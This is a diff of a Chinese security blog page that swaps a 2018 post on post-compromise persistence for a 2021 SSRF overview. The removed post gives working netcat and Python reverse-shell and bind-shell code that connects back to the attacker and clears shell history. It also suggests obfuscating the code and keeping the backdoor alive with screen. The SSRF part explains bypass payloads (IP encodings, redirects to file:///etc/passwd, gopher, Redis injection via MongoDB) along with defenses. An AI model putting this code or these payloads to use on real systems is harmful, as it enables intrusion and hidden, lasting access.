@@ -14,11 +14,11 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="搞定一个站之后经常要做持久化, 防止 webshell 被发现之后的尴尬局面, 或者是主动删除 webshell, 降低被发现的概率.">
+  <meta name="description" content="SecMap - SSRF，在内外网边界上打个洞">
   <meta name="author" content="Tr0y">
   <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
   
-  <title>持久化控制手段 - Tr0y&#39;s Blog</title>
+  <title>SecMap-SSRF - Tr0y&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -192,7 +192,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="持久化控制手段">
+            <span class="h2" id="subtitle" title="SecMap-SSRF">
               
             </span>
 
@@ -202,8 +202,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2018-06-02 14:47" pubdate>
-        星期六, 六月 2日 2018, 2:47 下午
+      <time datetime="2021-05-24 19:00" pubdate>
+        星期一, 五月 24日 2021, 7:00 晚上
       </time>
     </span>
   
@@ -214,7 +214,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      872 字
+      2.3k 字
     </span>
   
 
@@ -224,7 +224,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      15
+      33
        分钟
     </span>
   
@@ -262,73 +262,105 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">持久化控制手段</h1>
+            <h1 style="display: none">SecMap-SSRF</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：3 年前
+                  本文最后更新于：21 小时前
                 
               </p>
             
             <div class="markdown-body">
-              <p>搞定一个站之后经常要做持久化, 防止 webshell 被发现之后的尴尬局面, 或者是主动删除 webshell, 降低被发现的概率.<br><span id="more"></span></p>
-<h2 id="target-lt-gt-self"><a href="#target-lt-gt-self" class="headerlink" title="target &lt;=&gt; self"></a>target &lt;=&gt; self</h2><p>这种情况我们最喜欢了。畅通无阻</p>
-<h2 id="target-lt-x-self"><a href="#target-lt-x-self" class="headerlink" title="target &lt;=x self"></a>target &lt;=x self</h2><blockquote>
-<p>target 监听，self 请求</p>
-</blockquote>
-<p>target 监听:</p>
-<ul>
-<li>python: <code>python shell_forward.py self_port</code></li>
-</ul>
-<p>self 请求:</p>
-<ul>
-<li>nc: <code>nc target_ip target_port</code></li>
-</ul>
-<h2 id="target-x-gt-self"><a href="#target-x-gt-self" class="headerlink" title="target x=&gt; self"></a>target x=&gt; self</h2><p>不是所有服务器都可以被直接访问的, 这时候就需要反弹 shell</p>
-<blockquote>
-<p>target 请求，self 监听</p>
-</blockquote>
-<p>target 请求:</p>
-<ul>
-<li>nc: <code>nc -e /bin/sh self_ip self_port</code></li>
-<li>python: <code>python reverse_shell.py self_ip self_port</code></li>
-</ul>
-<p>self 监听:</p>
-<ul>
-<li>nc: <code>nc -l self_port</code> / <code>nc -l -p self_port</code></li>
-</ul>
-<h2 id="target-x-x-self"><a href="#target-x-x-self" class="headerlink" title="target x=x self"></a>target x=x self</h2><p>需要借助其他手段穿透 target 的内网。实际上最方便的就是放在公网的服务器上来接收反弹的 shell</p>
-<h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p><strong>reverse_shell.py</strong></p>
-<figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> sys<br><br>def shell(ip, port):<br>    s = socket.socket()<br>    s.connect((ip, port))<br>    s.sendall(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        recv = s.recv(<span class="hljs-number">1024</span>)<br>        <span class="hljs-keyword">if</span> recv == <span class="hljs-string">b&quot;exit\n&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> recv:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">proc</span> = subprocess.<span class="hljs-type">Popen</span>(recv, shell=<span class="hljs-type">True</span>, <span class="hljs-literal">stdout</span>=subprocess.<span class="hljs-type">PIPE</span>,<br>                                    <span class="hljs-literal">stderr</span>=subprocess.<span class="hljs-type">PIPE</span>, <span class="hljs-literal">stdin</span>=subprocess.<span class="hljs-type">PIPE</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">break</span><br>        s.sendall(<span class="hljs-keyword">proc</span>.<span class="hljs-literal">stdout</span>.read()+<span class="hljs-keyword">proc</span>.<span class="hljs-literal">stderr</span>.read()+<span class="hljs-string">b&quot;\n&gt; &quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">try</span>:<br>        shell(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">continue</span><br></code></pre></div></td></tr></table></figure>
-<p>或<br><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"># -*- coding:utf-<span class="hljs-number">8</span> -*-<br>import os<br>import socket<br>import pty  #or subprocess<br>import sys<br><br><br>def <span class="hljs-built_in">shell</span>():<br>    s = socket.<span class="hljs-built_in">socket</span>(socket.AF_INET, socket.SOCK_STREAM)<br>    s.<span class="hljs-built_in">connect</span>((sys.argv[<span class="hljs-number">1</span>], <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])))<br>    os.<span class="hljs-built_in">dup2</span>(s.<span class="hljs-built_in">fileno</span>(), <span class="hljs-number">0</span>)<br>    os.<span class="hljs-built_in">dup2</span>(s.<span class="hljs-built_in">fileno</span>(), <span class="hljs-number">1</span>)<br>    os.<span class="hljs-built_in">dup2</span>(s.<span class="hljs-built_in">fileno</span>(), <span class="hljs-number">2</span>)<br>    os.<span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;HISTFILE&quot;</span>)<br>    os.<span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;HISTFILESIZE&quot;</span>)<br>    pty.<span class="hljs-built_in">spawn</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>)  # or subprocess.<span class="hljs-built_in">call</span>([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br>    s.<span class="hljs-built_in">close</span>()<br><br>while <span class="hljs-number">1</span>:<br>    try:<br>        <span class="hljs-built_in">shell</span>()<br>    except:<br>        pass<br></code></pre></div></td></tr></table></figure></p>
-<p><strong>shell_forward.py</strong></p>
-<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> socket import *<br>import subprocess<br>import sys<br>server = socket(AF_INET, SOCK_STREAM)<br>server.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, int(sys.argv[1])))<br>server.listen(5)<br><span class="hljs-comment">#print &#x27;waiting for connect&#x27;</span><br><span class="hljs-keyword">while</span> 1:<br>    talk, addr = server.accept()<br>    #<span class="hljs-builtin-name">print</span> <span class="hljs-string">&#x27;connect from&#x27;</span>, addr<br>    proc = subprocess.Popen([<span class="hljs-string">&quot;python -c &#x27;import pty; pty.spawn(\&quot;/bin/sh\&quot;)&#x27;&quot;</span>],<br>                            <span class="hljs-attribute">stdin</span>=talk,<br>                            <span class="hljs-attribute">stdout</span>=talk,<br>                            <span class="hljs-attribute">stderr</span>=talk,<br>                            <span class="hljs-attribute">shell</span>=<span class="hljs-literal">True</span>)<br></code></pre></div></td></tr></table></figure>
-<p><strong>以上的代码均可使用 exec(“…”) 压缩然后进行各种各样的混淆/编码/加密</strong><br>exec 使用方法如下：<br><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">(<span class="hljs-string">&quot;print(&#x27;shell&#x27;)&quot;</span>)</span></span><br></code></pre></div></td></tr></table></figure></p>
-<h2 id="交互性"><a href="#交互性" class="headerlink" title="交互性"></a>交互性</h2><p>以上制造出来的 shell 功能受限, 如不小心按下 <code>Ctrl+c</code> 会退出, 箭头键无法使用, 无历史记录, tab 补全等等, 解决方法如下:</p>
+              <p>SecMap - SSRF，在内外网边界上打个洞</p>
+<span id="more"></span>
+<h1 id="SecMap-SSRF"><a href="#SecMap-SSRF" class="headerlink" title="SecMap - SSRF"></a>SecMap - SSRF</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>SSRF</code>，服务端请求伪造（<code>Server-side Request Forge</code>）的缩写。产生的原因是服务端提供了从其他服务器获取数据的功能，但没有对地址和协议等做过滤与限制。常见的一个场景就是：服务器通过用户输入的 URL 来获取图片。这个功能如果被恶意使用，可以利用存在缺陷的 Web 应用作为跳板来攻击远程和本地的服务器。</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>ssrf 主要分为：</p>
 <ol>
-<li>按上面的方法搞一个普通的 shell 出来</li>
-<li>Ctrl+z 把这个 shell 挂到后台执行</li>
-<li>运行 <code>stty raw -echo;fg;reset;reset</code></li>
+<li>回显型 ssrf</li>
+<li>无回显型 ssrf</li>
 </ol>
-<p>运行后是这样的:</p>
-<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/Ctrl4ever/20180917043242103.png!blog" srcset="/img/loading.gif" lazyload alt="p1"></p>
-<p>其实已经好了, 随便输入命令即可:</p>
-<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/Ctrl4ever/20180917043306818.png!blog" srcset="/img/loading.gif" lazyload alt="p2"></p>
-<p>此时的 shell 已经很完善了, 交互性很强</p>
-<h2 id="shell-后台持续连接"><a href="#shell-后台持续连接" class="headerlink" title="shell 后台持续连接"></a>shell 后台持续连接</h2><p>假如是反弹 shell, 反弹到你的服务器上去, 而你的服务器是用 ssh shell 连接到, 那么退出 ssh 后后门 shell 也跟着停止了. 可以使用 <code>screen</code> 实现后台持续:</p>
+<p>有回显型的 ssrf 就是会将访问到的信息返回给攻击者，而无回显的 ssrf 则不会，但是可以通过带外通道（比如 dnslog）或者访问开放/未开放的端口导致的延时来判断。</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>ssrf 危害的本质是穿透了内外网边界。</p>
+<p>我们可以这么考虑，作为攻击者，在外网想攻击位于内网的服务，这个时候如果有个未授权的 socks 代理可以直通内网，那是最好的，因为可以转发很多协议；那如果只有未授权的 http 代理呢？存在 ssrf 漏洞就相当于对外开放了一个比较难用的未授权的 http 代理。</p>
+<p>如果真的是有一个 http 代理，那我们还方便进行渗透测试；如果是 ssrf，无法直接配置给浏览器或者是类似 Burp Suite 这种工具使用；就算可以用来探测端口，那又能怎么样呢？这么看来 ssrf 的用处只限于攻击内部完全没有认证的页面（数据泄露）/接口（可能造成 RCE）；</p>
+<p>好在我们还有其他协议的支持，让 ssrf 从只能发出 http 请求变成可以发出更多协议类型的请求。</p>
+<h2 id="常用协议"><a href="#常用协议" class="headerlink" title="常用协议"></a>常用协议</h2><p>在 ssrf 里常用的有：</p>
 <ol>
-<li><code>screen -S shell</code> 创建一个名为 <code>shell</code> 的 <code>session</code>, 它会自动把当前这个 shell 弄成一个后台运行的 shell session, 所有在这个 shell 里运行的程序会一直保持持续状态, 即使你退出 ssh.</li>
-<li>按上面的步骤搞一个交互式的 shell</li>
-<li>退出 ssh(直接关闭终端), 去睡觉</li>
-<li>想继续使用后门 shell 的时候, 只需要重新登录 ssh, 然后用 <code>screen -lst</code> 查看所有的 session, <code>screen -r shell</code> 恢复叫 <code>shell</code> 的这个 session.</li>
+<li><code>http://</code>: 这个是我们最熟悉的，可用于浏览未授权页面、调用未授权接口、存在漏洞的 Web 组件直接上 exp、探测内网主机存活、端口开放情况，低配版 http 代理。</li>
+<li><code>gopher://</code>: “万金油” 协议。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求，极大拓宽了 SSRF 的攻击面。</li>
+<li><code>dict://</code>: 无法插入 <code>\r\n</code> 并且前后均有垃圾数据。</li>
+<li><code>file://</code>: 读取本地文件，这个没啥好说的。</li>
+<li><code>ldap://</code>: 有垃圾数据，可以插入 <code>\r\n</code>。</li>
 </ol>
-<p>经过测试, <code>nohup</code> + <code>&amp;</code> 是不行的, 关了 ssh 后进程是存在, 但是没法恢复。不知道有没有其他办法, 总之 <code>screen</code> 是比较好的了。</p>
-<h2 id="隐藏-webshell"><a href="#隐藏-webshell" class="headerlink" title="隐藏 webshell"></a>隐藏 webshell</h2><p><a href="https://www.tr0y.wang/2018/06/11/HideWebShell/">放链接</a></p>
-<h2 id="msf-的相关控制手段"><a href="#msf-的相关控制手段" class="headerlink" title="msf 的相关控制手段"></a>msf 的相关控制手段</h2><p>待更新</p>
-<h2 id="利用-user-ini-制造-PHP-后门"><a href="#利用-user-ini-制造-PHP-后门" class="headerlink" title="利用 .user.ini 制造 PHP 后门"></a>利用 .user.ini 制造 PHP 后门</h2><p><a href="https://www.tr0y.wang/2018/06/11/.user.ini的PHP后门-乌云知识库/">传送门🚪</a></p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>后面遇到更好的思路会再增加</p>
-<p><br><p style="text-align: center;" ><font size="2px" color="gray">来呀快活呀</font>
-<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="/img/loading.gif" lazyload style="zoom:30%" />
+<p>上一篇已经仔细讨论过各种协议，这里就不再展开说了，详见：</p>
+<p><a href="https://www.tr0y.wang/2021/05/17/SecMap-非常见协议大礼包/">https://www.tr0y.wang/2021/05/17/SecMap-非常见协议大礼包/</a></p>
+<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>一句话，能够对外发起网络请求的地方，就有可能有 ssrf：</p>
+<ol>
+<li>在线识图</li>
+<li>在线翻译：百度翻译，有道翻译</li>
+<li>图片的加载/下载/收藏/分享</li>
+<li>文章的订阅/收藏/分享/转载</li>
+<li>接收邮件服务器地址的邮件系统</li>
+<li>可以收取其他邮箱邮件的 Web Mail（POP3/IMAP/SMTP）</li>
+<li>文件处理，如 FFmpeg（<code>concat:http://tr0y.wang/a.m3u8|file:///etc/passwd</code>）、ImageMagick（<code>fill &#39;url(http://127.0.0.1)&#39;</code>）、XML（XXE 漏洞）…</li>
+<li>请求远程服务器资源，远程 URL 上传，静态资源图片文件等</li>
+<li>数据库内置功能，比如 MongoDB 的 copyDatabase 函数（mongo &lt;= v4.0），将未授权的 MongoDB 变成一个无回显 ssrf（<code>db.copyDatabase(&#39;\r\nset key Tr0y\r\nquit\r\n&#39;, &#39;test&#39;, &#39;127.1:6379&#39;)</code>）</li>
+<li>主从任务：master 节点（攻击者）可以派发给 slave 节点任务；</li>
+<li>Webhooks</li>
+<li>其他：从 URL 关键字中寻找：share、url、link、src、source、target、sourceURl、imageURL、domain 等等，这些关键字可以配合 Google 的搜索语法去寻找 ssrf 漏洞</li>
+<li>与 CRLF 组合</li>
+</ol>
+<h2 id="攻击技巧"><a href="#攻击技巧" class="headerlink" title="攻击技巧"></a>攻击技巧</h2><ol>
+<li>利用非常见协议，dict、gopher 等</li>
+<li>添加端口可能绕过匹配正则：<code>http://127.0.0.1/</code> 改为 <code>http://127.0.0.1:80/</code></li>
+<li>127.0.0.1 与 localhost 在大部分情况下都是等价的，取决于 hosts 配置</li>
+<li>利用 IPv6：<code>http://[::]:80/</code> 相当于 <code>http://127.0.0.1</code></li>
+<li>利用 <code>@</code> 可能绕过域名限定的正则：<code>http://example.com@127.0.0.1</code> 相当于 <code>http://127.0.0.1</code></li>
+<li>利用进制：以 <code>127.0.0.1</code> 为例，首先，ip 可以没 <code>.</code>，比如 <code>2130706433</code>（十进制），<code>0x7F000001</code>（十六进制）；也可以有 <code>.</code>，比如 <code>0x7F.0x000.0x001</code>（十六进制）、<code>0177.0000.0001</code>（八进制），甚至可以混用，比如 <code>0x7F.000.0x001</code>（十六进制 加 十进制）；还可以合并，<code>127.0.0.1 == 127.0.1 == 127.1</code>、<code>127.3.2.1 == 127.3.513 == 127.3.513 == 127.197121</code>，注意这个合并注意只能从前到后合并，具体的计算方式，可以按照 <code>.</code> 分割，分别先转为 8 位二进制，然后从左到右每段直接拼在一起，最后再转为十进制或者十六进制即可，有一个比较特殊的是 <code>0</code>，<code>0.0.0.0 == 0.0.0 == 0.0 == 0</code>，即目标服务器监听了 <code>0.0.0.0</code> 的服务都可以用此方法访问到。以上这几种方式可以随意组合搭配，而且其实各个进制的补 0 可以填很多个：<code>127.0.0000000000000000000000000000000000.1</code>。</li>
+<li>利用跳转：比如，利用短链，<code>http://dlj.bz/kA47FD</code> 相当于 <code>http://127.0.0.1</code>，本质上是利用 301 跳转，所以完全可以自己打一个 301 跳转，想怎么跳就怎么跳，别忘记同时还可以转换协议：<code>Location: file:///etc/passwd</code>。状态码可以是 301、302、307</li>
+<li>利用域名 A 记录：<a target="_blank" rel="noopener" href="http://localhost.tr0y.wang/">http://localhost.tr0y.wang/</a> ，在域名上设置 A 记录，指向 <code>127.0.0.1</code>。如果你实在懒，可以用 <code>xip.io</code>/<code>xip.name</code>，它的子域名前缀就是解析的 ip 地址，比如 <code>127.0.0.1.xip.io</code> 的 A 记录就是 127.0.0.1</li>
+<li>利用 IDN，详见：<a href="https://www.tr0y.wang/2020/08/18/IDN/">https://www.tr0y.wang/2020/08/18/IDN/</a> ，<code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 等于 <code>example.com</code>、<code>127。0。0。1</code> 相当于 <code>127.0.0.1</code></li>
+<li>与 CRLF 组合：比较经典的就是 Python 的 CVE（CVE-2016-5699、CVE-2019-9740、CVE-2019-9947、CVE-2019-9948），其实也是由于允许 <code>\r\n</code> 的存在，大大提升了通过 http:// 协议来利用的 ssrf 的杀伤力：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSRF/20210524152422.png!blog" srcset="/img/loading.gif" lazyload alt=""><br><br/><br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSRF/20210524152007.png!blog" srcset="/img/loading.gif" lazyload alt=""></li>
+<li>DNS 重绑定攻击：可见：<a href="https://www.tr0y.wang/2020/11/02/DNS-3-attack-by-dns/#DNS-重绑定攻击">https://www.tr0y.wang/2020/11/02/DNS-3-attack-by-dns/#DNS-重绑定攻击</a></li>
+</ol>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>ssrf 的修复比较复杂，需要根据业务实际场景来采取不同的方案。</p>
+<p>首先明确此类功能的流程：</p>
+<ol>
+<li>提取 URL 的域名</li>
+<li>解析 Host 的 ip</li>
+<li>发出请求</li>
+<li>如果有跳转，取出 Location URL，回到第 1 步；否则继续下一步</li>
+<li>发出最终的请求，实现业务逻辑</li>
+</ol>
+<p>那么自然就需要注意：</p>
+<ol>
+<li>过滤返回的信息/统一错误信息：将有回显变成无回显，提升利用难度（比如 file:// 就直接废掉了）</li>
+<li>限制请求的 ip 和端口：一般的业务禁掉私有 ip 完全可行；限制端口可有效降低攻击面</li>
+<li>去除 URL 中的特殊字符：防止因为 url 解析模块造成的问题，往往是 host 提取解析结果存在歧义（<strong>强烈建议阅读 资料 1</strong>）</li>
+<li>只允许 http 协议，必要时强制使用 https 协议，可以很大程度提升攻击难度，因为 SSL/TLS 握手过程无法完成（骚操作请参考 资料 2）</li>
+<li>解析/跳转（没必要就别跟随跳转了）后一定要进行检查：防止利用各种形式的 ip、跳转绕过</li>
+<li>完善正则表达式：这个没啥通用的技巧，根据具体的业务需求定，需要经过完善测试（限制 @ 的使用、防止用子域名前缀绕过等等）</li>
+<li>最后真正发起请求去获取资源的时候，可以把域名替换成之前就已经解析好的 ip，这样来避免重复解析带来的 DNS 重绑定攻击问题。</li>
+</ol>
+<p>最后，还可以考虑建立一个请求代理集群，外网代理集群专门用于业务对外网发起请求；另一个代理集群专门用于业务对内网发起请求。然后在网络上保证外网代理集群无法与内网互通。</p>
+<h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><ol>
+<li>ssrf 利用新纪元：<ul>
+<li><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></li>
+</ul>
+</li>
+<li>ssrf 遇到 TLS 的利用方式：<ul>
+<li><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-20/Wednesday/us-20-Maddux-When-TLS-Hacks-You.pdf">https://i.blackhat.com/USA-20/Wednesday/us-20-Maddux-When-TLS-Hacks-You.pdf</a></li>
+</ul>
+</li>
+<li>猪猪侠在乌云大会上关于 ssrf 的分享：<ul>
+<li><a target="_blank" rel="noopener" href="https://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf">https://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf</a></li>
+</ul>
+</li>
+</ol>
+<p><br><p style="text-align: center; font-weight: bolder" ><font size="2px" color="gray">本来下周要随公司回西电做宣讲的<br>议题与内容都准备好了<br>奈何内部沟通到出了点问题<br>没法通过公司的出差去了<br>嗯确实挺糟心的<br><br>然后最近一直在规划未来的发展<br>有很多想不明白的地方<br>这段时间确实颇有压力<br>所以虽然没法去参加宣讲和会议<br>但我还是决定下周回趟西电<br>散散心顺便找挚友聊聊天<br>等这段时间过去了<br>我再和大家聊聊最近的思考与决策<br><br>
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSRF/20210524163930.png!blog#width-zoom2" srcset="/img/loading.gif" lazyload/>
+</font>
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/6231619321876_.pic_hd.jpg" srcset="/img/loading.gif" lazyload style="width: 30%;" />
 </p></p>
 
             </div>
@@ -347,9 +379,9 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Python/">Python</a>
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
                     
-                      <a class="hover-with-bg" href="/tags/%E5%B7%A5%E5%85%B7/">工具</a>
+                      <a class="hover-with-bg" href="/tags/SecMap/">SecMap</a>
                     
                   </div>
                 
@@ -366,18 +398,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2018/06/18/MySQL%E7%9A%84BIGINT%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">MySQL 的 BIGINT 报错注入</span>
-                        <span class="visible-mobile">Vorheriger</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2018/05/29/ReIPdog/">
-                        <span class="hidden-mobile">ReIPdog - 查询旁站的脚本</span>
+                      <a href="/2021/05/17/SecMap-%E9%9D%9E%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE%E5%A4%A7%E7%A4%BC%E5%8C%85/">
+                        <span class="hidden-mobile">SecMap - 非常见协议大礼包</span>
                         <span class="visible-mobile">Nächster</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
